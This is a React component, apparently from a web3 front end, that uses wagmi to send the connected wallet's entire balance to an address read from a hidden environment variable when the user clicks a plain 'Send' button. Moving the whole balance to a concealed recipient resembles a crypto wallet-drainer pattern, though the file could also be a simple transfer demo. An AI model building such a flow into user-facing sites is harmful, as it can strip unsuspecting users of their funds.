import { useEffect } from "react";
import {
  useAccount,
  useBalance,
  useEstimateGas,
  useSendTransaction,
  useWaitForTransactionReceipt,
} from "wagmi";
import { parseEther } from "viem";

const recipient = import.meta.env.VITE_0X;

const SendTransaction = () => {
  const { address, isConnected } = useAccount();
  const { data: balanceData, isLoading: balanceIsLoading } = useBalance({
    address: address,
  });
  //   const { data: estimateGasData } = useEstimateGas();

  const {
    data: hash,
    isPending,
    sendTransaction,
    error,
  } = useSendTransaction();
  const { isLoading: isConfirming, isSuccess: isConfirmed } =
    useWaitForTransactionReceipt({ hash });

  const sendEntireBalance = async () => {
    const amount = parseEther(balanceData.formatted);
    sendTransaction({
      value: amount,
      to: recipient,
      gas: 21000,
    });
  };

  useEffect(() => {
    error && console.error(error);
  }, [error]);

  return (
    <>
      {isConnected && (
        <>
          <button disabled={isPending} onClick={() => sendEntireBalance()}>
            {isPending ? "Confirming..." : "Send"}
          </button>
          {hash && <div>Transaction Hash: {hash}</div>}
          {isConfirming && <div>Waiting for Confirmation.</div>}
          {isConfirmed && <div>Transaction is Confirmed.</div>}
          {error && (
            <div>
              Error:
              {error.shortMessage === "Connector not connected."
                ? "Please Connect Wallet"
                : error.shortMessage || error.message}
            </div>
          )}
        </>
      )}
    </>
  );
};

export default SendTransaction;
